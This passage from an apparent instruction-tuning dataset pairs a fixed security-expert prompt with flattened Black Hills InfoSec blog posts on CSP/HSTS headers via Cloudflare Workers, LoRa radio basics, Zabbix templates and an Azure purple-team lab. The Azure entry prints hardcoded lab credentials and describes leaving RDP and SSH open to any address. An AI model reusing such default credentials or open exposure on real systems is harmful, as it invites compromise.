scheme because it was the default We're probably safe to update the model to Bundled since our Workers execution time is less than 50ms The Workers dashboard will show the execution time so you can make your own decision Anyhow with the Unbound pricing model we weren't at much risk regardless Here's a picture of one month of Bundled worker activity on one of our busier websites At the end of the day 5.38 wasn't a bad cost to us for 1M website hits It's worth noting that you can and perhaps should limit your worker route to typically only affect website resources that will instruct a web browser to create additional sub-queries for resources These are typically HTML PHP ASP etc Images and videos usually do not need a CSP as they typically do not instruct the browser to create additional HTTP requests For example you may omit a web server directory that contains only images The worker routes can be stacked Setting a route to a service of None will prevent execution of workers OWASP Secure Headers Project Link wasp.org www-project-secure-headers For a good resource on the types of Security Headers and their appropriate use check out the OWASP documentation on Response Headers Content-Security-Policy Reference Link ontent-security-policy.com Another good resource perhaps a bit more technical is the Content-Security-Policy Resource This is an update to date compilation of current CSP mechanics and support matrix by browser Cloudflare HSTS Settings After you have set up your worker and configured your CSP according to your website's needs there are a handful of other settings in Cloudflare that will also need configuration to fully align your website with secure practices and get that better score on SecurityHeaders.io Be aware however that if your website or subdomains of your website are not also aligned according to these changes you may experience a headache getting everything setup Of note once HTTP Strict Transport Security HSTS is enabled there is no easy way to back out of configuration Ensure that subdomains of your domain and your TLD website are configured with HTTPS appropriately before continuing On your Cloudflare Dashboard jump to your domain and go to the SSL TLS section and then the Edge Certificate's tab You will find two sections that you should configure Always Use HTTPS Always Use HTTPS will automatically redirect port 80 from Cloudflare's edge to HTTPS 443 for your website regardless of if your origin server supports port 80 or serves other content from port 80 HTTP Strict Transport Security HSTS Enable HSTS and configure settings according to your need It's best practice to have the max-age header set to at least 6 months but this setting carries with it some risk Once enabled you must always support HTTPS on your site or a possibility exists that users will not be able to access your website Minimum TLS Version Unless your users are likely to be using unsupported or obsolete web browsers or clients it is typically safe to enable a minimum TLS version of 1.2 Versions 1.1 1.0 and SSL version 2 and version 3 are considered insecure by most security analysts despite a low threat probability Enable TLS 1.3 It's the new rage for this year Enable this option to support TLS 1.3 on the Cloudflare Edge for your web server Post-Change Testing After you have deployed the Cloudflare Worker and updated your Cloudflare Edge SSL TLS options it's time to check out if you've made any impact on your Security Headers score Let's use SecurityHeaders.io again to see if there has been improvement More Work CSP Refinement We're capped at an A because the website we host includes an unsafe-inline option in the Content-Security-Policy Ultimately you want to get rid of those but it can be used as a stopgap to make your website function as you continue to build a more restrictive CSP It's important to note that at the end of the day effectively every resource source used on a website should be explicitly listed within the CSP Unsafe source inclusions are unsafe ish Assisted Configuration CSP-as-a-Service There are some new products out that will assist you in determining your baseline Content-Security-Policy based on your existing website resources used There is a new CSP method report-uri that instructs web browsers to report CSP violations to a webservice that then notifies web administrators of the issue This is something akin to how DMARC reporting works allowing a domain owner to receive reports of potentially fraudulent email except in this case the alert is about CSP violations A handful of Content-Security-Policy report Service-as-a-Service products exist They are configured to be the recipient of your users browser's CSP violation reports They aggregate the reports and then provide you with an appropriate updated baseline Content-Security-Policy Frankly this is something that you can do yourself without the use of a product Load your webpage and check the Developer-Tools console for CSP violations Regardless a third-party service could go a long way in automating some of the monotony especially for very large or complex websites where manually confirming the entirety of the website rending and functioning appropriately is not possible Content-Security-Policy -As-A-Service Providers Not a sponsor Mileage and costs may vary sper.io o.talasecurity.io content-security-policy ithub.com kravietz cspbuilder Resources Cloudflare Workers orkers.cloudflare.com Template Worker ithub.com Relkci cf-worker-header-injector blob main worker.js SecurityHeaders.io ww.securityheaders.io Content-Security-Policy Reference ontent-security-policy.com OWASP Security Header Project wasp.org www-project-secure-headers Fix Missing Security Headers on Web server ww.blackhillsinfosec.com fix-missing-content-security-policy-website"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Introducing LoRa (Long Range) Wireless Technology - Part 1</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch, Wireless</taxonomies>\n<creation_date>Wed, 08 Dec 2021 20:20:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch This write-up is the first of a multi-part series providing an introduction to LoRa wireless technology and the LoRaWAN low-power wide-area network LPWAN Interestingly I came across this technology while researching a GPS tracking project that I was working on and quickly determined that this technology might be a viable alternative to using the GPS module The deeper my research into LoRa went I found the technology and the concept of sensor networks to be fascinating From what I can tell from my initial research LoRa appears to be a fairly new technology less than 6 years but is based upon CSS chirp spread spectrum and is similar to the spread spectrum frequency hopping techniques used in CDMA and other GSM protocols which is not new at all The general outline of this part of the series will begin with an introduction to LoRa and LoRaWAN highlighting the special use cases and including a working demonstration of a point-to-point line of sight communication between two REYAX LoRa modules Continuing on this series will proceed with introducing The Things Network TTN and how to build your own private LoRa Gateway for connecting to it LoRaWAN comprises both a commercial and community facet The Things Network is partnered with the LoRaAlliance and provides a community edition free access to the LoRaWAN This series will finish up by demonstrating how to interface your own end node sensor devices via your personal gateway to TTN and its server-side applications General Information With the increasing surge of IoT Internet of Things reaching billions of devices worldwide the demands being placed on the community of wireless technology developers and maintainers have also increased significantly Other wireless technologies such as WiFi Bluetooth Classic Bluetooth Low Energy Zigbee Zwave etc all play a significant role in providing support for the many use-cases of IoT devices currently in circulation Each of these technologies can adequately address the specific needs of an IoT device such as transferring high volumes of data streaming video and audio automation and monitoring wearables fitness and health short-range communications medical automotive and agriculture industries and asset tracking just to name a few Although these various wireless technologies fill an important need in regard to providing robust features and functionality for our IoT devices each has its own inherent limitations Generally speaking in terms of wireless communication the limitations become obvious when comparing available bandwidth data rate versus desired range For example based on the diagram below we can see that a Bluetooth Classic headset might have a maximum range of approximately 50m with a data rate of just a few Mbps This makes it ideal for delivering a reasonably sized payload of audio however the bandwidth would not be sufficient to support streaming video Notice that WiFi and Cellular technologies support a much higher data rate due to the higher bandwidth available and can easily support streaming video and high internet traffic but at a cost of high power and in the case of WiFi at an additional cost of signal range Link-Budget The trade-offs between the various wireless technologies are often expressed in terms of 'link-budget which basically means the total cost to get a signal 'linked from point-A to point-B calculated in dBm In reality the formulas and calculations used by engineers to determine link-budgets are quite complex and take many things into consideration besides simply bandwidth versus range Geographical locations operating environment and buildings can obstruct and or reflect RF radio frequency signals introducing loss in signal strength Amplifier gain antenna gain impedance mismatches between cabling and antenna resulting in high SWR all have an effect on signal strength and receiver sensitivity Ultimately there are many factors that can affect the overall link-budget Referring to the same diagram we see that LoRa has an extremely low link-budget low cost to deliver signal especially considering the higher distances range that it can achieve This makes it an ideal choice for communicating with extremely low power IoT end devices where battery life is paramount This is all made possible by keeping the data payloads as small as possible which is typically the case with sensor-type endpoint devices Introducing LoRa LoRa is a Low Power Long Range wireless technology focused on providing extremely low power years on a single coin battery and long range 10 miles line-of-site solutions while working with IoT devices that typically generate very small data payloads packets such as humidity temperature and moisture sensors actuators or water and gas meter monitoring LoRa operates in the license-free ISM Industrial Scientific and Medical purposed sub-gigahertz band and is ideal for implementing low power wide area LPWAN sensor networks LoRa is a proprietary low-power wide-area network modulation technique developed by Cycleo of Grenoble France and acquired by Semtech founding member of the patented LoRaAlliance It is based on spread-spectrum modulation techniques derived from chirp spread spectrum CSS technology The allocated radio frequencies consist of EU 433 433.05-434.79 MHz and EU 863-870 863-870 873 MHz in Europe AU915-928 AS923-1 915-928 MHz in Australia US 902-928 902-928 MHz in North America IN 865-867 865-867 MHz in India AU 915-928 AS 923-1 and EU433 Southeast Asia 4 and 2.4GHz worldwide Be careful to check that the transceiver frequency matches the band for your region when purchasing LoRa radio modules Introducing LoRa Alliance and LoRaWAN The LoRa Alliance is comprised of more than 500 members including technology leaders like IBM Cisco and HP as well as leading product companies such as Schneider Bosch Diehl and Mueller The goal of the alliance is to standardize a strong and growing ecosystem for the high-volume deployment of low power Internet of Things wide-area networks LPWAN Their ambitious goals entail being able to connect 50 of the predicted IoT volumes They currently have 163 network operators in 177 countries According to the Alliance Network operators agree that they can only connect 10-15 of the predicted volume of IoT devices with classic licensed bands cellular technologies WiFi and BT Smart serve some applications well but clearly you are not going to connect moisture sensors for agriculture with WiFi LPWA low-power wide-area with the inherent long range and low power characteristics will be the 'go-to technology for IoT applications where remote locations easy deployment thousands of connections per gateway and long battery life are required While LoRa defines the physical radio layer the application and media access control MAC layers LoRaWAN specification is defined by the LoRa Alliance and acts as a networking layer protocol which manages communications between its gateways and end nodes IoT devices As stated by the LoRa Alliance The LoRaWAN specification is a Low Power Wide Area LPWA networking protocol designed to wirelessly connect battery operated 'things to the internet in regional national or global networks and targets key Internet of Things IoT requirements such as bi-directional communication end-to-end security mobility and localization services OTA Duty Cycle Note The 'over-the-air duty cycle of radio devices is often regulated by the government and is commonly set to 1 Likewise the LoRaWAN specification dictates duty cycles for the join frequencies the frequencies devices of all LoRaWAN-compliant networks use for over-the-air activations OTAA of devices In most regions this duty cycle is also set to 1 Additionally The Things Network community edition has adopted a Fair Use Policy At first these restrictions might seem to be a bit constraining but in the use-case of low-power sensor node networks this can work in our favor Andreas Spiess described it best in his tutorial LoRa LoRaWAN De-Mystified see link at the end of this write-up Based on the fact that our gateway concentrator has 8 RF channels that means it can support up to 8 IoT devices in parallel Realizing that 8 devices is small in comparison to the projected goals of hundreds of nodes per gateway we could use these same 8 devices for 50 of the time and thereby increase our network of sensors by an additional 8 devices Following that same concept if we were to limit each device to operate for only 1 of the time we can now support 800 nodes on our network on a single gateway which by the way is also in compliance with the governing laws Security Keys LoRaWAN 1.0 specifies a few security keys NwkSKey AppSKey and AppKey All keys are 128 bits in length and using the AES-128 algorithm allows for the encrypting decrypting of payloads similar to the algorithm used in the 802.15.4 standard When joining a new endpoint device to the network the device is first registered to an application created by the account holder of the gateway When a device is registered joined it is assigned an APPEUI DEVEUI and APPKEY all unique to the device When activating the device for deployment on the network the NwkSkey and AppSKey session keys are created using the mutually known AppKey The NwkSKey is shared with the network and the AppSKey is kept private As the name implies the session keys are used for the duration of the current session and are regenerated on every subsequent over-the-air-activation OTAA session Note Legacy versions of the LoRaWAN specification allowed for static activation of devices using Activation by Personalization ABP If ABP was used for activation the same session keys are used for all sessions unless manually changed by the account holder Going forward with version 3.0 The Things Stack OTAA appears to be the preferred and more secure method of activation Network Session Key NwkSKey Interaction between the endpoint node and the LoRaWAN server uses the NwkSKey to validate the integrity of each message with Message Integrity Code MIC in the same manner used in the 802.15.4 standard The MIC LoRaWAN uses AES-CMAC prevents tampering with the message Application Session Key AppSKey The AppSKey is used for the encryption and decryption of the payload The payload is encrypted between the endpoint node and the Handler Application Server protecting the messages sent and received from being read OTA Application Key AppKey The AppKey is known only by the device and the application and as stated above is used for generating the two session keys Note The Things Network TTN also allows us to use a default AppKey or customize our own Frame Counters As with any wireless communication protocol over-the-air captures of the radio signal is entirely possible and with devices as cheap as 25 Fortunately for us our data is encrypted using the AppSKey and the network traffic is protected from tampering using the MIC message integrity code check Frame Counter implementation was introduced in the 802.15 standard to help prevent replay attacks where signals are captured and re-transmitted to spoof the original device When a device is activated the frame counters FCntUp and FCntDown are set to zero Simply put when a message uplink occurs the FCntUp is incremented and likewise when a message downlink occurs the FCntDown is incremented If either the device or network sees a frame counter less than the last seen frame counter the entire message is dropped ignored thereby preventing MitM man in the middle attacks Introducing The Things Network The Things Stack is version 3 of an enterprise-grade LoRaWAN network server built on an open-source core The Things Stack allows us to build and manage LoRaWAN networks on our own hardware as well as in the cloud The Things Stack is deployed for a variety of commercial deployment scenarios however they also provide a Community Edition deployment which offers a 'free-to-use network server that provides the world's largest community-based LoRaWAN network To get connected with this free crowd-sourced open and decentralized LoRaWAN network users need to sign-up for an account with TTN and either purchase or build their own gateway to connect to the network I opted to build my own gateway using a Raspberry Pi-4 and RAK2243 Pi-HAT and I will share this information later in the series The Things Network is based upon an open-source project that is dedicated to building a network for IoT devices based upon a protocol that allows these devices to connect to the internet without WiFi or cellular connectivity The basic concept is centered upon endpoint sensor device transmissions being heard by a 'within-range gateway which then connects to the LPWAN.Later in this series I intend on providing a step-by-step guide to building your own personal LoRaWAN gateway for under 100 and demonstrate how to connect your DIY home-built or store-bought sensors to The Things Network using LoRaWAN via your gateway Simple LoRa Communication Demonstration The following demonstration is based on an excellent example presented by akarsh98 of CETech see link at the end of this write-up Hardware 2 ESP32 microcontroller modules amazon.com ESP-WROOM-32-Development-Microcontroller-Integrated-Compatible dp B08D5ZD528 2 REYAX RYLR890 LoRa Radio Modules amazon.com RYLR896-Module-SX1276-Antenna-Command dp B07NB3BK5H Dupont jumper wires amazon.com s?k Jumper Wire Dupont ref nb_sb_noss_2 These radio modules can be interfaced using any micro-controller as we will be using a standard UART TX RX connection to communicate with the onboard STM32 microcontroller chip Previously I interfaced to the STM32 chip using an Arduino Uno development board and a small sketch but for this demonstration I will be using an ESP32 device These are amazing inexpensive micro-controllers with built-in WiFi and Bluetooth compatibility out-of-the-box Note Typically sensor endpoints would not need the WiFi Bluetooth capability of an ESP32 and would not be used in the wild as those are high-power consumption features and defeat the intended goal of low power and long battery life However for the purpose of demonstrating LoRa wireless communication the ESP32 provides us with a quick and simple setup 4 wires and requires no soldering As stated earlier our LoRa example is based upon a project by akarsh98 of CETech which uses two ESP8266 forerunner to the newer ESP32 and two REYAX RYLR890 LoRa Modules Note that I modified his code to support the newer ESP32 UARTS The ESP32 has three hardware UARTs on-board so the developers felt there was no longer a need to support the SoftwareSerial libraries used with the ESP8266 The wiring is quite simple Vcc and Gnd from the LoRa module goes to Vcc and Gnd on the ESP32 device Tx from the LoRa module goes to GPIO-16 RX2 pin of the ESP32 and the Rx from the LoRa module goes to GPIO-17 TX2 pin of the ESP32 The fact that the LoRa module contains an on-board STM32 microcontroller allows us to communicate to the LoRa radio module using a special set of AT commands Our ESP32 device will communicate these commands directly to the STM32 over serial UART The STM32 microcontroller acting on our AT commands will control the LoRa radio module for us Later in the series we will see how to control other LoRa radios directly using our code and special open-source LoRa libraries LoRa Module AT Commands As stated earlier we will be sending special AT commands to control the LoRa radio There are many AT commands available to us link provided at the end of this write-up but we will be using a few of the basic commands to get us up and running quickly Generally the AT commands fall into one of two groups configuration and operational Configuration AT Commands First we need to configure the radio module AT MODE 0 Transmit and Receive mode default 1 Places radio in sleep mode AT IPR 300 115200 default is 115200 AT PARAMETER see below AT BAND 868500000 Europe 915000000 US default is US AT ADDRESS 0 65535 default is 0 Spreading Factor 7 12 default is 12 Bandwidth 0 9 default is 7 125 kHz Coding Rate 1 4 default is 1 Programmed Preamble 4 7 default is 4 Spreading Factor and Bandwidth are two of the most important parameters with regard to LoRa low-power and range considerations The higher the spreading factor the greater the over-the-air OTA time resulting in more power and better range but at a cost of reduced data rate This is where LoRa can be flexible with regard to configuring for range or for low-power operation Admittedly it took me a bit of time before I finally sorted this all out so I'll try and explain it with an example First the data rate depends on the bandwidth used and spreading factor LoRaWAN can use channels with a bandwidth of either 125 kHz 250 kHz or 500 kHz depending on the region or the frequency plan The spreading factor is chosen and set by the end device sensor and influences the time it takes to transmit a frame Increasing the bandwidth or decreasing the spreading factor allow the bytes to be sent in a shorter period of time The general rule is doubling the bandwidth allows us to send twice the data payload in the same amount of time Likewise decreasing the spreading factor by one also allows us to send twice the data payload in the same amount of time Keep in mind that lowering the spreading factor can also make it more difficult for the gateway to receive the transmitted signal due to it being more susceptible to noise If the gateway is a great distance away you might use a higher spreading factor SF10 data rate will be slower but more reliable If the gateway is in close proximity we can afford to use a lower spreading factor SF7 and increase our data rate Obviously keeping our data payloads as small as possible contributes to overall data rate range and power consumption Operational AT Commands After configuring the radio we are ready to begin transmitting and receiving which can be accomplished with the following commands Note The address of each LoRa Module Transmitter and Receiver must be identical in order to communicate with each other Transmitting AT SEND Address 0 65535 Payload Length Max 240 bytes Data ASCII format Receiving RCV same as SEND with two additional parameters RSSI Received Signal Strength Indicator is Received Signal Strength Indicator measured in dB and SNR is the Signal-to-Noise-Ratio measured in dB Note 'AT is not required for Receiving because we are simply receiving data not actually issuing a radio command Upload the code assumes Arduino IDE is installed and operational Connect an ESP32 to a USB port on the PC Enter the Arduino IDE and under tools select ESP32 Dev Module board and USB port Upload the code sketch to the ESP32 Disconnect the ESP32 and connect the second ESP32 Follow the same steps for the second ESP32.LoRa Radio Messenger sketch copy and paste as a new sketch for both ESP32 devices LoRa transmitter receiver messenger llcoder 11-18-2021 There are three serial ports on the ESP known as U0UXD U1UXD and U2UXD U0UXD is used to communicate with the ESP32 for programming and during reset boot U1UXD is unused and can be used for your projects Some boards use this port for SPI Flash access though U2UXD is unused and can be used for your projects define RXD2 16 LoRa TX ESP32 RX2 define TXD2 17 LoRa RX ESP32 TX2 include String incomingString String PrStr String used to print the incoming string after decoding it void setup Serial.begin 115200 Serial2.begin 115200 SERIAL_8N1 RXD2 TXD2 ESP32 UART void loop if Serial.available incomingString Serial.readString if incomingString.length 2 Serial.print YOU Serial.println incomingString String messStr AT SEND 0 messStr AT COMMAND is to be sent to the LoRa module to send the relevant data messStr incomingString.length -2 messStr messStr incomingString Serial2.print messStr else if Serial2.available this will read the incoming data from the lora and decode it and print it on serial monitor incomingString Serial2.readString String recTest incomingString.substring 1 4 if recTest RCV String messagesize int addr_start incomingString.indexOf int addr_mid incomingString.indexOf addr_start 1 messagesize incomingString.substring addr_start 1 addr_mid PrStr incomingString.substring addr_mid 1 addr_mid 1 messagesize.toInt Serial.print THEM Serial.println PrStr Sample Output Both ESP32 devices have been programmed with the same code and are capable of transmitting as well as receiving For this demonstration one ESP32 is connected to a laptop via USB and the second ESP32 is connected to a mobile phone via OTG-USB Serial terminals have been opened on both devices and are in receive mode monitoring for LoRa radio signals If the signal received does not specify the correct address in its header the message is dropped ignored Otherwise it is accepted and displayed in both terminals The following screenshot shows a typical back and forth message sequence Test Results Testing was done to determine the approximate range for reliable two-way communication In my location urban area with buildings trees and hills the line-of-site is somewhat limited With myself stationed at the laptop indoors a family member completed a trek outside with the phone and we both closely monitored our two-way communication Based upon this preliminary run I determined the range to be approximately 150 meters Obviously with one of the radios being indoors where the signal is obstructed by the structure it is likely that this contributed to a significantly reduced range For this reason we conducted another test on an urban stretch of road line-of-site and less obstructed by buildings trees or hills In this case we found that our range had increased to approximately 700 meters 0.5 miles but still well below the 13km claimed by Semtech and others Taking into account that our radio modules are presently attached to the microcontroller using push-on cabling rather than soldered and are being powered via USB OTG adapters rather than dedicated power banks a more definitive test may be in order preferably conducted in a more rural and less populated area Summary Although LoRa wireless and LoraWAN appear to be tightly coupled to a specific use-case of IoT technology extremely small data payload devices sensors activators etc there is an obvious need for this new wireless technology if for no other reason than to off-load the already heavily taxed traffic of existing Bluetooth and Wifi IoT devices More so in an agricultural environment where the range of coverage could be in the order of miles Bluetooth and WiFi fall seriously short Likewise with a deployment of hundreds if not thousands of sensors to a wide area battery maintenance becomes an important concern and battery changes need to be held to a minimum With LoRa wireless technology sensors have been verified to last years on a single button cell battery and under ideal rural conditions reach line-of-site ranges of 13km 10 miles or ideal urban conditions of 5km 3 miles As a side note researchers have proposed that LoRaWAN could solve some of the issues regarding the power demands of 4G 5G technologies LoRa Wiki states that chirp spread spectrum may also be used in the future for military applications as it is very difficult to detect and intercept when operating at low power Fun fact CHIRP of CSS is yet another acronym that stands for Compressed High Intensity Radar Pulse At the time of this writing LoRa and LoRaWAN are still in their infant stage approximately 5 years old but are rapidly gaining momentum Personally I am pretty amazed with the entire concept of IoT Low-Power Wide Area Networks and how the community is quickly adopting and getting involved with this new wireless technology So much so that I have recently built my own personal LoRa gateway which is connected to The Things Network and I am currently developing experimental sensor nodes that send humidity and temperature payloads to the LPWAN Part Two of this series I will go on to describe how to build your own personal LoRa Gateway for under 100 using a Raspberry-Pi and RAK2243 Pi-HAT and how to connect it to The Network of Things Additionally this series would not be complete if I did not demonstrate how to create an application and register activate a sensor node to the application Once activated we will be able to connect to the TTN web-based console and watch the live data as it is received via the gateway Stay tuned Informative Links ora-developers.semtech.com documentation tech-papers-and-guides lora-and-lorawan Semtech DEVELOPER PORTAL ww.youtube.com watch?v hMOwbNUpDQA Andreas Spiess 112 LoRa LoRaWAN De-Mystified Tutorial ww.youtube.com watch?v jnvik7sUosw CETech LoRa based messenger Project LoRaWAN LoRa Basic Project lay.google.com store apps details?id de.kai_morich.serial_usb_terminal hl en_IN USB Serial Terminal Mobile app ww.thethingsnetwork.org TTN The Things Network ww.thethingsnetwork.org docs lorawan security LoRaWAN Security Keys ww.youtube.com watch?v dxYY097QNs0 Excellent video explaining the LoRa chirp ww.youtube.com watch?v"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Zabbix Templates for Security Analysts and Systems Administrators  EOY 2021</title>\n<taxonomies>Author, Informational, InfoSec 101, Kent Ickler, Kent Ickler, Monitoring, Opsec</taxonomies>\n<creation_date>Thu, 16 Dec 2021 20:08:24 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler Background BHIS uses several tools for monitoring infrastructure One of the most important tools for us that helps monitor systems health is Zabbix It's been a while since I went about creating Zabbix ww.zabbix.com monitoring templates Long story short I took a backseat role to Systems Administration a couple years ago when we hired DRock and later Napalm-Nick to kick butt on our systems team while I transitioned the majority of my time to penetration testing I helped out the Systems team occasionally throughout the year including a rebuild of our Zabbix monitoring platform The new Zabbix version that had been released since our previous deployment had some bugfixes and new features especially with how the system captures JSON type data In the course of the last year we've deployed multiple new Zabbix instances To help the Systems team monitor the difficult-to-monitor systems and services I've created a handful of Zabbix templates that help BHIS keep an eye on things while we're asleep or otherwise occupied with other projects Not everyone will find these useful but some of you may Other security firms using the same API technologies to help us augment data will find some of the templates useful for monitoring API usage credit allowances etc Here's a quick rundown of new templates we've created as open-source and how you could use them in your own operations Interface Bandwidth Aggregates Bandwidth-vnstat Link ithub.com Relkci Zabbix_Bandwidth-vnstat This template uses the Linux tool vnstat to monitor traffic per interval day and month Alerts can be configured on an interface if network bandwidth will breach certain configurable thresholds Below are some sample graphs from the template and BHIS's own www.blackhillsinfosec.com webserver FullContact API Link ithub.com Relkci Zabbix_FullContact_API It's not surprising that BHIS uses API service to augment their security research and penetration testing FullContact www.fullcontact.com is a service that aggregates company user information and provides results in JSON format or via their website interface BHIS created a Zabbix template to monitor the API credit allowance and usage of the FullContact platform Sendgrid Email Delivery Link ithub.com Relkci Zabbix_Sendgrid_Api_Provider BHIS uses Sendgrid www.sendgrid.com for its delivery of some marketing-based emails We also use it for things like alerting and some transactional-type emails This Zabbix template monitors email-send credits account information spam reports unsubscribe reports IP reputation and the like Alerts are configured to let us know when we are short on credits or when administrative changes are made to the platform Here's a screenshot of a sample graph showing the suppression over time Censys.IO API Monitor Link ithub.com Relkci Zabbix_Censys.io-API-Status Much like FullContact BHIS uses Censys.io to augment some of its data analysis This Zabbix template monitors API usage and allowances and alerts us if our credits are approaching overages WPScan API Monitor Link ithub.com Relkci Zabbix_WPScanAPIStatus WPScan is a tool that can perform analysis of WordPress based websites It can enumerate plugins users themes and even find vulnerabilities A service related to WPScan is www.wpscan.com that can execute these scans via an API request This Zabbix template monitors the use of the wpscan.com API account and lets us know if we approach our API allowance Shodan.IO API Monitor Link ithub.com Relkci Zabbix_Shodan-APIStatus Shodan.io has been around for ages Shodan is known for scanning the public internet and aggregating services it identifies A service of Shodan.io allows organizations to monitor their own internet footprint as well as do adhoc scans of the Shodan.io public internet database This Zabbix template monitors the API usage of our Shodan.io account and lets us know if we're running out of credits VirusTotal API Monitor Link ithub.com Relkci Zabbix_VirusTotalAPIStatus There is a wealth of hunter and malware information at VirusTotal that can assist both red and blue teams be efficient in malware creation as well as threat hunting and Incident Response This Zabbix template monitors the VirusTotal API usage across a multitude of VirusTotal's products Alerts are configured to let us know if we are about to breach our API allowance and to let us know about account administrative changes MailChimp Marketing Monitor Link ithub.com Relkci Zabbix_MailChimpStats Much like BHIS uses Sendgrid to send some transactional and marketing emails we also use MailChimp for some of our more targeted emails to users that have subscribed to our mailing lists This Zabbix template monitors campaign administration email send statistics bounce-backs and account security The Zabbix triggers alert us when they see a problem Here's a couple of sample screenshots Augmented Geolocation with IPStack Link ithub.com Relkci Zabbix_GeoLocation-IPStack Zabbix saves some information about a monitored host or service that can be used to augment information using other services In this case we use the public IP of a host with IPStack www.ipstack.com to augment geolocation data of the host itself This allows us to then create groupings and aggregations of statistics based on the geographical locations of user servers without having to worry about manually updating them This template also monitors the IPStack account API usage and lets us know if there are issues Here's a couple of screenshots of the resulting augmented data Cloudflare Tunnel Metrics Link ithub.com Relkci Zabbix_Cloudflared Cloudflare has some incredible products We use some One of their products is Cloudflare Argo Tunnels The service is probably going to be renamed soon but in short you can think of it as a reverse proxy Anyway this Zabbix template monitors our Cloudflare Tunnels and lets us know when things don't look healthy Here's a few screenshots of this template Nessus Professional Monitor Link ithub.com Relkci Zabbix_Nessus-Professional_Monitoring We use a variety of vulnerability scanners at BHIS Tenable's Nessus has been in the game for quite a while This Zabbix template monitors the health of our Nessus deployments as well as some operational and administrative information An alert lets us know when problems are identified Here are some screenshots Security Scorecard Link ithub.com Relkci Zabbix_SecurityScorecard Last but not least is a service that we got familiar with over the past year I'm not posting this as a product announcement for Security Scorecard CJ and I have gone rounds about their service and how it can be pretty awesome for Third-Party Risk Management departments That aside BHIS created a small deployment within the Security Scorecard service to monitor some of our vendor's attention to security posture or something Let's just say we're undecided on how meaningful the data is CJ already asked me for a webcast on this topic so someday Anyway this Zabbix template monitors the Security Scorecard grades and scores for your organizations your vendors and your competitors The template will let you know when your score or the percentage of your score compared to your competitors changes It can also let you know if your vendors scores change These screenshots are pretty hard to snag without throwing out our vendors and competitors names competitors are fine we're like extended family Anyhow here's some of the generalized graphs Using Zabbix has allowed us to monitor several of our automated operational and administrative processes for both statistics and security oversight We hope these templates might be of some use to you To be alerted to future templates we build subscribe notifications to this repository and you'll be notified when we make updates ithub.com Relkci Zabbix-Templates References Zabbix Templates ithub.com Relkci Zabbix-Templates Zabbix ww.zabbix.com Full Contact ww.fullcontact.com Sendgrid endgrid.com Censys ensys.io Shodan ww.shodan.io VirusTotal ww.virustotal.com MailChimp ailchimp.com IPStack pstack.com Cloudflare Tunnel ww.cloudflare.com products tunnel Tenable Nessus ww.tenable.com products nessus Security Scorecard ecurityscorecard.com"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Azure Sandbox  Purple Edition</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, General InfoSec Tips & Tricks, Hunt Teaming, Informational, Jordan Drysdale, Jordan Drysdale</taxonomies>\n<creation_date>Tue, 08 Feb 2022 14:21:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Azure has replaced AWS in my personal development pipeline This may sound crazy but hear me out Microsoft has solidified its offerings done nothing but improve its security posture and in my opinion gone above and beyond to root out threats at its core While AWS was the innovator and maintains that title in cloud space they are experiencing what all early adopters go through in business They are quickly learning that some of their offerings have legit competition on other platforms both technically and financially Azure's integration with a dashboard logs query tool easy to deploy endpoint protection solutions full-stack security operations through Sentinel and less expensive OS licensing has created an alternative that I love Opinions aside the point of this article is to introduce some fundamental concepts of the Azure marketplace and its capabilities We will also get to the purple team lifecycle of threat hunting that is so near and dear to my life's work Without further ado the topics ARM templates and deployments Log analytics Microsoft Defender for Identity was MDATP Microsoft Sentinel Purple teaming concepts Azure Sentinel was introduced as a threat hunting platform around this time last year That work relied on the OTRF frameworks built by Roberto and Jose Luis Rodriguez That blog is linked below ww.blackhillsinfosec.com azure-sentinel-quick-deploy-with-cyb3rward0gs-sentinel-to-go-lets-catch-cobalt-strike That work relied on an Azure Resource Manager template ARM to deploy a domain attack rig and services in accordance with the ARM definitions There is also some opportunity during deployment for customization Simply stated find a base template customize it to your needs click a button rock and roll The Azure team maintains a repo on GitHub with an ARM template starter for everyone's needs Link ithub.com Azure azure-quickstart-templates Clicking through the active-directory quick-start directory lands at the following page where we can finally click to deploy That is Azure Resource Manager Easy customizable extensible and infinitely capable of meeting even the most complex needs Now as a consummate purple teamer my needs are simple All I need to perform a lifecycle is a domain joined workstation attack rig and somewhere to search logs The button shown in the next screenshot does it all www.doazlab.com and ithub.com DefensiveOrigins DO-LAB Also no Azure account Claim your free credits zure.microsoft.com en-us free The process is straightforward click to deploy Create a new Resource group or choose an existing and change the location The next screen asks what size of VM you would like There are three in total one DC one WS one Linux Finally the template asks if you would like to restrict the two RDP listeners and SSH to a trusted netblock I generally leave mine configured as all zeroes for threat research purposes The credentials are hardcoded in this version You may want to use this build as a template I would advise changing these credentials to either prompt during the build process or change them in your ARM template Domain doazlab.com Username doadmin Password DOLabAdmin1 The last page confirms your configuration and forces you to accept the terms and conditions In about 45 minutes we can start threat hunting Navigate to portal.azure.com and find your Log Analytics workspace Click on the Virtual machines button The 